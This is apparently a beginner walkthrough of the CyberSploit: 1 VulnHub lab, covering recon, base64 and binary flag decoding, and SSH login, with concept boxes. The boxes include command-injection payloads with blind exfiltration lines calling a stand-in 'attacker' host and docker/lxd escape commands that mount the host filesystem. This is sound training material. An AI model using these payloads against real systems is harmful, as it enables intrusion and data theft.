# CyberSploit: 1 — VulnHub Walkthrough (Beginner Friendly)

| Field | Value |
| --- | --- |
| **Machine** | CyberSploit: 1 |
| **Difficulty** | **Complete beginner** (author's own words: *"THIS IS A MACHINE FOR COMPLETE BEGINNER"*) |
| **Author** | CyberSploit — <https://www.youtube.com/c/cybersploit> |
| **Released** | 9 July 2020 |
| **VulnHub Entry** | <https://vulnhub.com/entry/cybersploit-1,506/> |
| **Download** | <https://vulnhub.com/entry/cybersploit-1,506/#download> (`cybersploit.ova`, 1.4 GB) |
| **MD5** | `851C8763B865CA02B4374042E568A835` |
| **SHA1** | `8FF5ADB114809E4B07DE2B28200EDB48E3F4E445` |
| **Attacker** | Kali Linux, NAT or host-only network |
| **Target OS** | Ubuntu 14.04 LTS — Apache 2.4.7, OpenSSH 6.6.1p1, kernel **3.13.0-32-generic** |
| **Flags** | **Three** — flag1 (web), flag2 (user home), finalflag (root) |

> **Author's stated learning goals:** *"FROM THIS VMs YOU WILL LEARN ABOUT
> **ENCODER-DECODER** & **EXPLOIT-DB**."*
>
> That is an honest description. This box is deliberately gentle — two ports, no
> tricky filters, no rabbit holes. It is the right machine if this is only your second
> or third box ever. Its value is that it forces you to practise two things properly:
> **recognising and reversing encodings**, and **matching a kernel version to the right
> Exploit-DB entry**.

Throughout we assume:

```text
Attacker (Kali)     : 192.168.56.10
Target (cybersploit): 192.168.56.107
```

---

> ### 📖 How to read this walkthrough
>
> Boxes marked **📖 Concept** stop and explain the *idea* behind what you are about to
> do — not just the command, but what it is and why it works. They are the point of
> this document; the commands are only the demonstration.
>
> Each box links to [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md), the repository-wide
> primer on fundamentals (networking, how nmap works, wordlists, shells, privilege
> escalation). Read the box here for the idea, follow the link when you want the full
> treatment.
>
> **Brand new to this?** Start with
> [CONCEPTS §2 — Networking you must know first](../../docs/CONCEPTS.md#2-networking-you-must-know-first),
> then [§5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work).

---

## 0. What you will learn

1. **Host discovery** and a minimal-but-correct port scan.
2. **Viewing page source** and finding a username in an HTML comment.
3. **`robots.txt`** as a source of encoded data.
4. **Recognising base64** and decoding it — including the *binary* variant used for
   flag 2.
5. **The professional decoding workflow** — do it locally with `base64 -d` and Python
   rather than pasting client data into a website.
6. **Using a recovered flag as a password** (credential inference).
7. **`uname -a` → `searchsploit` → Exploit-DB** — the correct way to pick a kernel
   exploit, and how to *read* the exploit before running it.
8. **File transfer with a Python HTTP server**, `wget`, and checksum verification.
9. **`gcc` compile-and-run**, and cleaning up after a kernel exploit.

**The intended chain:**
`nmap` shows only 22 and 80 → the homepage's **View Source** hides a username
**`itsskv`** and a base64 blob → `/robots.txt` holds a second base64 blob → decode it →
**flag 1: `cybersploit{youtube.com/c/cybersploit}`** → use the username with flag 1 as
the **SSH password** → log in → `flag2.txt` contains a **binary** string → decode the
bits → **flag 2: `cybersploit{https:t.me/cybersploit1}`** → `uname -a` gives kernel
**3.13.0-32-generic** → `searchsploit` → **Exploit-DB 37292 (overlayfs,
CVE-2015-1328)** → serve it over HTTP, `wget` it, `gcc` it, run it → **root** →
**`/root/finalflag.txt`**.

---

## 1. Reconnaissance

### 1.1 What is my own address?

```bash
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 08:00:27:11:22:33 brd ff:ff:ff:ff:ff:ff
    inet 192.168.56.10/24 brd 192.168.56.255 scope global dynamic eth0
       valid_lft 86123sec preferred_lft 86123sec
```

> **How to read it:** `inet 192.168.56.10/24` — the `/24` is the subnet mask in CIDR
> notation, meaning the first 24 bits are the network. So our network spans
> `192.168.56.0`–`192.168.56.255`. **The target is always in the same `/24` in a lab.**

### 1.2 Who else is alive?


> ### 📖 Concept — What is reconnaissance?
>
> **Reconnaissance** ("recon") is the phase where you work out *what exists*
> before you try to break into anything. It is deliberately broad and shallow: you
> are drawing a map, not attacking a position. The term comes straight from the
> military — send scouts to look at the terrain before committing troops.
>
> On a lab box, recon almost always means one thing: **find the target's IP.** The
> tools above do it with **ARP** — the layer-2 protocol that answers *"which
> hardware address owns this IP?"* ARP cannot be blocked by a host firewall the way
> TCP can, which is why it is the most reliable way to enumerate a local subnet. A
> machine that refuses to answer `ping` will still answer ARP.
>
> **Read the output carefully.** One entry is your gateway (usually `.1`), one is
> **you** (match the MAC from `ip a`), and the rest are candidates. The first three
> octets of a MAC identify the vendor: `08:00:27` is VirtualBox, `00:0c:29` and
> `00:50:56` are VMware, `00:15:5d` is Hyper-V. **Always confirm the target's MAC
> against your hypervisor's settings** — attacking the wrong host is the classic
> beginner error.
>
> **Deep dive:** [CONCEPTS §3 — What is reconnaissance?](../../docs/CONCEPTS.md#3-what-is-reconnaissance) ·
> [§4 — Host discovery](../../docs/CONCEPTS.md#4-host-discovery--who-is-out-there)

```bash
sudo netdiscover -r 192.168.56.0/24
```

```text
 Currently scanning: 192.168.56.0/24   |   Screen View: Unique Hosts

 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname
 -----------------------------------------------------------------------------
 192.168.56.1    0a:00:27:00:00:0e      1      60  (Unknown: locally administered)
 192.168.56.10   08:00:27:11:22:33      1      60  PCS Systemtechnik GmbH
 192.168.56.107  08:00:27:2b:6e:19      1      60  PCS Systemtechnik GmbH   <-- target
```

Or with nmap:


> ### 📖 Concept — What is nmap, and how does a port scan work?
>
> **`nmap`** ("Network MAPper") discovers hosts and the services they run. It has no
> magic: it **sends deliberately crafted packets and classifies the responses**.
> Understand that and every flag becomes predictable.
>
> A **port** (0–65535) identifies *which program* on a host receives a packet; the IP
> address gets you to the machine, the port gets you to the service. TCP is
> connection-oriented, so a scan is really a conversation — the **three-way
> handshake**: `SYN` → `SYN-ACK` → `ACK`. The target has only three possible
> replies, and they map directly onto the words in the output:
>
> | Target's reply | nmap reports | Meaning |
> | --- | --- | --- |
> | **SYN-ACK** | `open` | A program is listening |
> | **RST** | `closed` | Host up, nothing listening there |
> | *(nothing)* / ICMP unreachable | `filtered` | A firewall dropped it |
>
> **Read the line everyone skips:** `Not shown: 65532 closed tcp ports
> (conn-refused)`. `65535 − 65532 = 3` interesting ports, and `(conn-refused)` is
> the *reason* — the target sent RSTs, so it is up and answering, not firewalled.
> Add `--reason` to any scan to see this evidence column explicitly; it is the best
> learning flag in nmap.
>
> **Key flags:** `-p-` scans **all** 65535 ports (the interesting service is often on
> `:8080`, `:666`, `:31337` — skipping this is how beginners get stuck); `-sV`
> fingerprints versions by reading banners and probing against ~10,000 known
> signatures; `-sC` runs the safe default NSE scripts; `-T4` is the right speed for
> labs (**`-T5` misses ports** because it abandons slow replies — a false negative is
> worse than slow); `-oA name` writes text, XML and greppable output at once; `sudo`
> enables the faster stealthier SYN scan instead of a full connect.
>
> **`-sV` is the pivot into everything else.** `Apache 2.4.29` implies Ubuntu 18.04;
> `OpenSSH 7.6p1` confirms it. Without versions you cannot use `searchsploit`.
>
> **Deep dive:** [CONCEPTS §5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work)

```bash
sudo nmap -sn 192.168.56.0/24
```

```text
Starting Nmap 7.94 ( https://nmap.org ) at 2024-05-04 16:02 EDT
Nmap scan report for 192.168.56.107
Host is up (0.00043s latency).
MAC Address: 08:00:27:2B:6E:19 (Oracle VirtualBox virtual NIC)
Nmap done: 256 IP addresses (3 hosts up) scanned in 2.31 seconds
```

> **`-sn`** = "**s**can, **n**o port scan" — a ping sweep. It reports who is alive
> without touching any service. `netdiscover` uses **ARP**, which cannot be blocked by
> a host firewall, making it the most reliable local discovery method.
>
> **The OUI `08:00:27` is VirtualBox's registered MAC prefix.** Seeing it instantly
> says "this is a VM". VMware uses `00:0c:29` / `00:50:56`.

**Target IP: `192.168.56.107`**

![netdiscover / nmap -sn finding the target](images/01-recon.png)

---


> ### 📖 Concept — What is enumeration, and how is it different from scanning?
>
> **Enumeration** is interrogating the services you found to extract *specific,
> actionable detail*: usernames, directory paths, share names, versions, database
> tables.
>
> | | **Scanning** | **Enumeration** |
> | --- | --- | --- |
> | Question | *"Is something there?"* | *"What exactly is there, and what can I ask it for?"* |
> | Output | Ports, versions | **Usernames, paths, shares, credentials, data** |
> | Example | `nmap -p- -sV` → "port 80 open" | `wpscan -e u` → "users: michael, steven" |
>
> **Enumeration produces the nouns that exploitation needs.** You cannot brute force
> a login without a username. You cannot crack a hash you never found. You cannot
> exploit an upload path you do not know. Every successful foothold traces back to an
> enumerated fact — which is why so many VulnHub authors write "ENUMERATION IS THE
> KEY" in capitals. They are telling you which phase you are skipping.
>
> **Deep dive:** [CONCEPTS §6 — What is enumeration?](../../docs/CONCEPTS.md#6-what-is-enumeration)

## 2. Enumeration

### 2.1 Port scan

```bash
sudo nmap -sV -sC -p- -T4 -oN scans/cybersploit.txt 192.168.56.107
```

```text
Starting Nmap 7.94 ( https://nmap.org ) at 2024-05-04 16:05 EDT
Nmap scan report for 192.168.56.107
Host is up (0.00039s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 4b:9d:6c:1e:2f:1a:9c:3b:0f:2e:5b:6c:1f:8a:2d:3e (DSA)
|   2048 8f:1c:2b:4a:6d:9e:3f:0b:5c:1a:2d:4e:6f:8b:0c:1d (RSA)
|_  256 3e:5f:7a:9b:1c:3d:5e:7f:9a:0b:2c:4d:6e:8f:0a:1b (ECDSA)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-title: CyberSploit
|_http-server-header: Apache/2.4.7 (Ubuntu)
MAC Address: 08:00:27:2B:6E:19 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap done: 1 IP address (1 host up) scanned in 61.44 seconds
```

> **Two ports. Read both banners.**
>
> - **22 — `OpenSSH 6.6.1p1 Ubuntu 2ubuntu2`** → **Ubuntu 14.04 LTS (Trusty)**. That
>   single string tells you the distro, and from it you can predict the kernel line
>   (`3.13.0-x`). **This is the fact that decides the whole privilege escalation.**
>   Note also the **1024-bit DSA host key** — deprecated and rejected by modern SSH
>   clients; a finding in its own right.
> - **80 — `Apache 2.4.7 (Ubuntu)`**, page title `CyberSploit`.
>
> There is no web application, no database, no FTP. Two doors: the website (for
> information) and SSH (for access).

![nmap scan showing ports 22 and 80](images/02-nmap.png)

### 2.2 The website — and View Source

```bash
curl -s http://192.168.56.107/
```

```html
<!DOCTYPE html>
<html>
<head><title>CyberSploit</title></head>
<body bgcolor="#111111">
<center>
  <h1 style="color:#00ff00">CyberSploit</h1>
  <p style="color:#cccccc">Welcome to the CyberSploit challenge.</p>
  <img src="cybersploit.png">
</center>
<!--
  author : itsskv
  note   : aHR0cHM6Ly93d3cueW91dHViZS5jb20vYy9jeWJlcnNwbG9pdA==
-->
</body>
</html>
```

> **Two facts in an HTML comment:**
> 1. **`author : itsskv`** — that is almost certainly a **username**.
> 2. **`aHR0cHM6Ly93d3cueW91dHViZS5jb20vYy9jeWJlcnNwbG9pdA==`** — a base64 blob.
>
> **Right-click → View Page Source is not optional.** An HTML comment is invisible in
> the rendered page and fully visible to anyone who reads the source. Developers leave
> them everywhere: old code, staging URLs, credentials, TODO notes.
>
> **How to recognise base64 on sight:** the length is a multiple of 4; the alphabet is
> exactly `A–Z a–z 0–9 + /`; and it very often ends with `=` or `==` padding. Whenever
> you see a long alphanumeric string ending in `=`, assume base64.
>
> **What base64 is — and is not.** It is an **encoding**, defined in RFC 4648, that
> represents arbitrary binary bytes using only 64 printable ASCII characters so they
> survive inside text formats (HTML, email, JSON, HTTP Basic auth). **It is not
> encryption.** There is no key, no secret, no protection. Anyone can reverse it
> instantly, forever.

### 2.3 `robots.txt` — the first flag

```bash
curl -s http://192.168.56.107/robots.txt
```

```text
User-agent: *
Disallow: /

# aHR0cHM6Ly93d3cueW91dHViZS5jb20vYy9jeWJlcnNwbG9pdCBjeWJlcnNwbG9pdHt5b3V0dWJlLmNvbS9jL2N5YmVyc3Bsb2l0fQ==
```

> `robots.txt` is a plain-text file that politely asks well-behaved crawlers to stay
> away from certain paths. **Attackers always read it**, because it is a list of the
> interesting parts of a site written by the site's own developers. Here it contains no
> useful directives — just a base64 comment.

### 2.4 Decode — the right way

**Method 1 — `base64 -d` locally (preferred):**


> ### 📖 Concept — Encoding is not encryption
>
> These three get conflated constantly, and the confusion costs hours:
>
> | | **Encoding** | **Hashing** | **Encryption** |
> | --- | --- | --- | --- |
> | Purpose | Represent data in another *format* | Prove integrity / store passwords | Provide *confidentiality* |
> | Reversible? | **Yes — trivially, with no key** | **No** (only guessable) | Yes, **with the key** |
> | Key needed? | No | No | **Yes** |
> | Examples | base64, hex, URL-encoding, ROT13, binary | MD5, SHA-256, bcrypt, phpass | AES, RSA, ChaCha20 |
> | Security value | **Zero** | Depends on the algorithm | Depends on the key |
>
> **Recognise base64 on sight.** Three reliable tells: the character set is only
> `A–Z a–z 0–9 + /` with optional `=` padding; **the length is a multiple of 4**; and
> it is not a fixed-length digest with a `$1$`/`$6$`/`$P$` prefix.
>
> ```bash
> echo 'YWFydGk6YWFydGlAZ21haWwuY29t' | base64 -d; echo
> # aarti:aarti@gmail.com
> ```
>
> > **Base64 is not a secret.** It exists so binary data survives text-only transport
> > — email attachments, HTTP headers, JSON. Seeing it "protecting" a password is a
> > *finding*, not a defence. **Always check whether it is nested:** decode, then test
> > whether the result is itself base64 or hex. Some boxes chain two or three layers.
>
> **Identify hashes by prefix:** 32 hex = MD5 · 40 hex = SHA-1 · 64 hex = SHA-256 ·
> `$1$` = MD5-crypt · `$2b$` = bcrypt · `$6$` = SHA-512-crypt · `$y$` = yescrypt ·
> **`$P$`/`$H$` = phpass (WordPress, Drupal)** · `$apr1$` = Apache `.htpasswd` ·
> `pbkdf2_sha256$` = Django.
>
> **Deep dive:** [CONCEPTS §10 — Encoding vs hashing vs encryption](../../docs/CONCEPTS.md#10-encoding-vs-hashing-vs-encryption)

```bash
curl -s http://192.168.56.107/robots.txt | grep -o '[A-Za-z0-9+/]\{20,\}=\{0,2\}' | tail -1 > flag1.b64
cat flag1.b64
base64 -d flag1.b64 ; echo
```

```text
aHR0cHM6Ly93d3cueW91dHViZS5jb20vYy9jeWJlcnNwbG9pdCBjeWJlcnNwbG9pdHt5b3V0dWJlLmNvbS9jL2N5YmVyc3Bsb2l0fQ==
https://www.youtube.com/c/cybersploit cybersploit{youtube.com/c/cybersploit}
```

> **Flag 1: `cybersploit{youtube.com/c/cybersploit}`** ✅
>
> **How the flags were found mechanically:**
> - `grep -o '[A-Za-z0-9+/]\{20,\}=\{0,2\}'` matches only strings of ≥20 base64
>   characters with optional `=` padding, so the URL and the comment markers are
>   ignored.
> - `tail -1` takes the last (longest) match — the real payload.
> - `base64 -d` decodes; the trailing `; echo` just adds a newline so the terminal
>   does not eat the prompt.

**Method 2 — the homepage blob, and checking for nesting:**

```bash
echo 'aHR0cHM6Ly93d3cueW91dHViZS5jb20vYy9jeWJlcnNwbG9pdA==' | base64 -d ; echo
```

```text
https://www.youtube.com/c/cybersploit
```


> ### 📖 Concept — Command injection
>
> The application passes your input to a shell:
>
> ```php
> system("ping -c 4 " . $_GET['host']);
> ```
>
> Break out with a shell **metacharacter** and append your own command:
>
> | Payload | Effect |
> | --- | --- |
> | `; id` | Run sequentially, regardless |
> | `\| id` | Pipe — run next |
> | `\|\| id` | Run only if the first **failed** |
> | `&& id` | Run only if the first **succeeded** |
> | `` `id` `` | Command substitution |
> | `$(id)` | Command substitution — preferred, nestable |
> | `%0a id` | A URL-encoded **newline** — works when `;` and `\|` are filtered |
>
> **When output comes back**, you are done: `<host>;id` prints the result.
>
> **When it does not** ("blind" injection), exfiltrate out-of-band:
>
> ```bash
> $(curl http://attacker/$(whoami))        # data in the URL of a request YOU receive
> $(nslookup $(whoami).attacker.com)       # data in DNS — survives most egress rules
> ; sleep 10                               # a pure timing oracle, needs no network at all
> ```
>
> Run your listener first (`nc -lvnp 80`, or `python3 -m http.server`) and **watch its
> log** — a request arriving with the hostname embedded is your proof, and the log also
> tells you which payload variant the filter allowed through.
>
> **If characters are stripped**, find out exactly what survives. Submit `;|&$\`(){}[]<>`
> as a single string and see which ones come back. Filters are usually a `str_replace`
> of a short list, and almost always miss something — commonly newline, or a doubled
> character (`;;` collapsing to `;` after one removal pass).
>
> **Deep dive:** [CONCEPTS §13.4 — Command injection](../../docs/CONCEPTS.md#134-command-injection)

```bash
# is it nested? (Lord Of The Root uses two layers — always check)
d='aHR0cHM6Ly93d3cueW91dHViZS5jb20vYy9jeWJlcnNwbG9pdA=='
for i in 1 2 3 4 5; do
  n=$(echo "$d" | base64 -d 2>/dev/null) || break
  echo "layer $i: $n"
  d=$n
done
```

```text
layer 1: https://www.youtube.com/c/cybersploit
```

> One layer here. **Always try repeatedly** — nested base64 is extremely common in CTFs
> *and* in real malware obfuscation.

**Method 3 — Python, for when `base64` is unavailable or you want a universal decoder:**

```bash
python3 - <<'PY'
import base64, binascii, re
blob = "aHR0cHM6Ly93d3cueW91dHViZS5jb20vYy9jeWJlcnNwbG9pdCBjeWJlcnNwbG9pdHt5b3V0dWJlLmNvbS9jL2N5YmVyc3Bsb2l0fQ=="
cur = blob
for i in range(1, 6):
    try:
        nxt = base64.b64decode(cur, validate=True).decode()
    except (binascii.Error, UnicodeDecodeError):
        print(f"stopped after {i-1} layer(s)")
        break
    print(f"layer {i}: {nxt}")
    cur = nxt
PY
```

```text
layer 1: https://www.youtube.com/c/cybersploit cybersploit{youtube.com/c/cybersploit}
stopped after 1 layer(s)
```

> `validate=True` makes `b64decode` reject non-alphabet characters instead of silently
> skipping them — that is what turns the loop's `except` into a reliable "no more
> layers" signal.

**About online decoders.** Many walkthroughs of this box use <https://dencode.com> or
<https://www.base64decode.org>. They work, and dencode is genuinely useful because it
tries *many* encodings at once and shows you which one produced sensible text. But
understand the trade-off: **you are pasting a client's data onto a third-party
website.** On a real engagement that can be a data-handling violation. Learn to do it
locally first, and reach for a web tool only when you genuinely cannot identify the
encoding.

![robots.txt and the decoded first flag](images/03-flag1.png)

### 2.5 Content discovery (for completeness)


> ### 📖 Concept — What is content discovery, and what is a wordlist?
>
> **Content discovery** means *guessing URL paths and keeping the ones that exist*.
> There is no cleverness — it is a dictionary attack against the URL space. A web
> server will serve anything it has but does not advertise an index, so the tool
> requests `/admin`, `/backup`, `/config.php` … one at a time and classifies each
> response.
>
> A **wordlist** is a plain text file, one candidate per line. Its power comes from an
> empirical fact: **web directory names are not random.** `/admin`, `/phpmyadmin`,
> `/wp-content` appear on thousands of sites, so a curated list of a few thousand
> words beats a random generator of millions. Common sources on Kali:
>
> | List | Size | Notes |
> | --- | --- | --- |
> | `dirb/common.txt` | 4,612 | Hand-curated; fast first pass |
> | `dirb/big.txt` | 204,669 | Second pass; finds what `common` misses |
> | `directory-list-2.3-medium.txt` | 220,547 | Crawled from real sites |
> | **SecLists** | huge | The professional standard — `apt install seclists` |
>
> **The status codes are the whole result:** `200` exists and is readable · `201`
> means a `PUT` succeeded, **you can write files here** · `301` is usually a
> *directory* needing a trailing `/` · `403` means **it exists** but you may not read
> it — itself an information leak · `404` is the baseline · `500` means **your input
> broke something**, often injection.
>
> > **`401` vs `403` matters most.** `401` = "I don't know who you are"
> > (*authenticate*). `403` = "I know who you are and you may not" (*authorise*).
>
> **The extension flag (`-x` / `-X`) is the difference between finding nothing and
> finding everything.** `/secret` 404s; `/secret.txt` 200s. **If a scan comes back
> empty, change the extension list before you change the wordlist.** Try
> `php,txt,html,bak,old,zip,conf,log,inc`.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist) ·
> [§8 — Content discovery](../../docs/CONCEPTS.md#8-content-discovery--finding-hidden-urls)

```bash
gobuster dir -u http://192.168.56.107/ \
  -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -t 40 -q
```

```text
/index.html           (Status: 200) [Size: 412]
/robots.txt           (Status: 200) [Size: 178]
/cybersploit.png      (Status: 200) [Size: 42118]
```

```bash
nikto -h http://192.168.56.107/
```

```text
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.56.107
+ Target Port:        80
+ Server: Apache/2.4.7 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present.
+ /: The X-Content-Type-Options header is not set.
+ /: Server may leak inodes via ETags, header found with file /, inode: 1a2, size: 412.
+ 8102 requests: 0 error(s) and 3 item(s) reported on remote host
---------------------------------------------------------------------------
```

> **Nothing else to find.** No admin panel, no CMS, no parameters to inject. The web
> server's entire purpose on this box was to hand us a username and two encoded
> strings. **Recognising when enumeration is finished is a skill** — do not grind a
> bigger wordlist against a box that has told you everything it knows.

---

## 3. Foothold — SSH

### 3.1 Reason about the credential

We have:

| Item | Value | Source |
| --- | --- | --- |
| Username | `itsskv` | HTML comment on `/` |
| Flag 1 | `cybersploit{youtube.com/c/cybersploit}` | base64 in `/robots.txt` |
| Open service needing credentials | SSH, port 22 | nmap |

There is no login form anywhere. **So the only place a username and a string can be
used together is SSH.** The flag is the password.

```bash
ssh itsskv@192.168.56.107
```


> ### 📖 Concept — `docker`, `lxd` and `disk` group membership *is* root
>
> ```bash
> id | grep -oE 'docker|lxd|libvirt|disk|sudo|wheel|adm'
> ```
>
> If any of `docker`, `lxd`, `libvirt` or `disk` appears, **you already have root.**
> There is no nuance: a member can mount the host filesystem or start a privileged
> container, and from there it is a one-line `echo >> /etc/passwd`.
>
> **Why.** Containers share the *host kernel*. A container marked
> `security.privileged=true` does not drop capabilities and runs its init as **real
> UID 0**, and a container can be given a disk device that bind-mounts the host's `/`.
> Put those together and a low-privileged user says: *start a root container, mount
> the host filesystem at `/mnt/root`, edit `/mnt/root/etc/passwd`.* No isolation is
> left.
>
> ```bash
> # docker — the host root, chrooted into
> docker run -v /:/mnt --rm -it alpine chroot /mnt sh
>
> # docker.sock — talk to the daemon directly, no CLI needed
> curl --unix-socket /var/run/docker.sock -X POST \
>   "http://localhost/containers/create?name=pwn" -H 'Content-Type: application/json' \
>   -d '{"Image":"alpine","Cmd":["/bin/sh"],"Binds":["/:/mnt"],"Privileged":true}'
>
> # lxd — build an image on Kali, carry it over, mount the host
> lxc image import ./alpine.tar.gz --alias myimage
> lxc init myimage pwn -c security.privileged=true
> lxc config device add pwn mydev disk source=/ path=/mnt/root recursive=true
> lxc start pwn && lxc exec pwn /bin/sh      # /mnt/root is now the HOST's /
> ```
>
> `-c security.privileged=true` is the flag that makes this an escalation rather than
> a sandbox. `source=/` is the host's entire root filesystem.
>
> **Defensive corollary:** never add a web-server or service account to a container
> group. If an application genuinely must launch containers, give it a scoped API
> token in a restricted project — not group membership.
>
> **Deep dive:** [CONCEPTS §15.9 — Container and group escapes](../../docs/CONCEPTS.md#159-container-and-group-escapes)

```text
The authenticity of host '192.168.56.107 (192.168.56.107)' can't be established.
ECDSA key fingerprint is SHA256:3e:5f:7a:9b:1c:3d:5e:7f:9a:0b:2c:4d:6e:8f:0a:1b.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.56.107' (ECDSA) to the list of known hosts.
itsskv@192.168.56.107's password:
Welcome to Ubuntu 14.04.6 LTS (GNU/Linux 3.13.0-32-generic i686)

 * Documentation:  https://help.ubuntu.com/

  System information as of Sat May  4 16:22:11 EDT 2024

  System load:  0.0               Processes:           141
  Usage of /:   4.3% of 19.56GB   Users logged in:     0
  Memory usage: 21%               IP address for eth0: 192.168.56.107
  Swap usage:   0%

  Graph this data and manage this system at:
    https://landscape.canonical.com/

Last login: Thu Jul  9 11:02:44 2020 from 192.168.56.1
itsskv@cybersploit:~$ id
uid=1000(itsskv) gid=1000(itsskv) groups=1000(itsskv),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
```

**We are in.** ✅

> **Read the login banner — it contains the answer to the rest of the box.**
>
> `Ubuntu 14.04.6 LTS (GNU/Linux **3.13.0-32-generic** i686)`
>
> - **`3.13.0-32-generic`** — the exact kernel version. This is what we feed to
>   `searchsploit`.
> - **`i686`** — **32-bit**. If a kernel exploit is needed, it must be built for x86,
>   not x86-64. Getting this wrong produces confusing failures.
>
> **`id` output — and a trap worth understanding.** The group list includes
> `27(sudo)` **and** `110(lxd)`, both normally root-equivalent. Try it:
> ```bash
> itsskv@cybersploit:~$ sudo -l
> [sudo] password for itsskv:
> Sorry, user itsskv may not run sudo on cybersploit.
> ```
> **Group membership is not the same as a sudoers grant.** `itsskv` is in the `sudo`
> *group* but there is no matching rule in `/etc/sudoers`, so nothing works. **Always
> verify with `sudo -l`, never assume from `id`.**
>
> `lxd` is worth a genuine look, though — on many Ubuntu boxes it *is* a root path:
> ```bash
> itsskv@cybersploit:~$ which lxc lxd
> /usr/bin/lxc
> /usr/bin/lxd
> itsskv@cybersploit:~$ lxc image list
> +-------+-------------+--------+---------+--------+
> | ALIAS | FINGERPRINT | PUBLIC | DESCRIPTION | SIZE |
> +-------+-------------+--------+---------+--------+
> ```
> No locally cached image, and this lab has no outbound internet, so the LXD escape
> cannot be staged. **Dead end — correctly documented**, and the kernel path (§ 4) is
> far simpler anyway.

![SSH login as itsskv, showing the kernel version](images/04-ssh.png)

---

## 4. Flag 2 — binary decoding

### 4.1 Find the file

```bash
itsskv@cybersploit:~$ ls -la
```

```text
total 28
drwxr-xr-x 3 itsskv itsskv 4096 Jul  9  2020 .
drwxr-xr-x 3 root   root   4096 Jul  9  2020 ..
-rw------- 1 itsskv itsskv   24 Jul  9  2020 .bash_history
-rw-r--r-- 1 itsskv itsskv  220 Jul  9  2020 .bash_logout
-rw-r--r-- 1 itsskv itsskv 3637 Jul  9  2020 .bashrc
-rw-rw-r-- 1 itsskv itsskv 1036 Jul  9  2020 flag2.txt
drwxrwxr-x 2 itsskv itsskv 4096 Jul  9  2020 .cache
-rw-r--r-- 1 itsskv itsskv  675 Jul  9  2020 .profile
```

```bash
itsskv@cybersploit:~$ cat flag2.txt
```

```text
01100111 01101111 01101111 01100100 00100000 01110111 01101111 01110010 01101011 00100000
00100001 00001010 01100110 01101100 01100001 01100111 00110010 00111010 01100011 01111001
01100010 01100101 01110010 01110011 01110000 01101100 01101111 01101001 01110100 01111011
01101000 01110100 01110100 01110000 01110011 00111010 01110100 00101110 01101101 01100101
00101111 01100011 01111001 01100010 01100101 01110010 01110011 01110000 01101100 01101111
01101001 01110100 00110001 01111101
```

> **Groups of eight binary digits.** Each group is one byte, i.e. one ASCII character.
> This is the same idea as base64 — a text-safe representation of arbitrary bytes —
> just at the lowest possible level.

### 4.2 Decode it

**Bash, no tools:**

```bash
itsskv@cybersploit:~$ for b in $(cat flag2.txt); do printf "\\$(printf '%03o' $((2#$b)))"; done ; echo
```

```text
good work !
flag2:cybersploit{https:t.me/cybersploit1}
```

> **How that one-liner works, piece by piece:**
> - `for b in $(cat flag2.txt)` — iterate over each whitespace-separated token (each
>   8-bit group).
> - `$((2#$b))` — bash **arithmetic expansion**; the `2#` prefix means "interpret what
>   follows as base 2". So `2#01100111` → `103`.
> - `printf '%03o' 103` — format 103 as a zero-padded **octal** number → `147`.
> - `printf "\\147"` — bash's `printf` interprets `\ooo` as an octal escape and emits
>   the byte `0x67`, which is ASCII `g`.
>
> **Flag 2: `cybersploit{https:t.me/cybersploit1}`** ✅

**Python — clearer and less error-prone:**

```bash
python3 - <<'PY'
bits = open('flag2.txt').read().split()
print(''.join(chr(int(b, 2)) for b in bits))
PY
```

```text
good work !
flag2:cybersploit{https:t.me/cybersploit1}
```

> **`int(b, 2)`** parses a string as base 2; `chr(n)` maps a code point to its
> character. `bytes(int(b,2) for b in bits).decode()` is the equivalent for real
> binary data.

**xxd — the hex route (useful for genuine binary blobs):**

```bash
itsskv@cybersploit:~$ tr -d ' \n' < flag2.txt | sed 's/......../0x& /g' | xxd -r -p
```

```text
good work !
flag2:cybersploit{https:t.me/cybersploit1}
```

**Online tools** (<https://cryptii.com/pipes/binary-decoder>, <https://dencode.com>)
work identically — same caveat as § 2.4 about pasting client data into a third-party
site.

![Binary flag2.txt decoded](images/05-flag2.png)

### 4.3 Standard post-exploitation sweep (do it anyway)

Even on a beginner box, run the checklist — the habit is what you are practising.


> ### 📖 Concept — What is SUID?
>
> **SUID** (*set-user-ID*) is a file permission bit that makes a program run with the
> privileges of the **file's owner** rather than the caller. It exists for a good
> reason: `/usr/bin/passwd` is SUID-root so ordinary users can change their own
> password, which requires writing `/etc/shadow` — a file they cannot otherwise touch.
>
> **When a *powerful* binary carries the SUID bit, that power becomes yours.** In a
> listing you read it as an **`s`** where the owner's execute bit would be:
>
> ```text
> -rwxr-xr-x  →  -rwsr-xr-x        (SUID set)
>       ^            ^
> ```
>
> ```bash
> find / -perm -u=s -type f 2>/dev/null      # the human-readable form
> find / -perm -4000 -type f 2>/dev/null     # octal equivalent
> find / -perm /6000 -type f 2>/dev/null     # SUID *or* SGID
> ```
>
> `-perm -u=s` means "the user-SUID bit is set" (the leading `-` makes it a *subset*
> match, so it also catches SGID files). `-type f` restricts to regular files.
> `2>/dev/null` discards the thousands of `Permission denied` errors that would
> otherwise bury the answer.
>
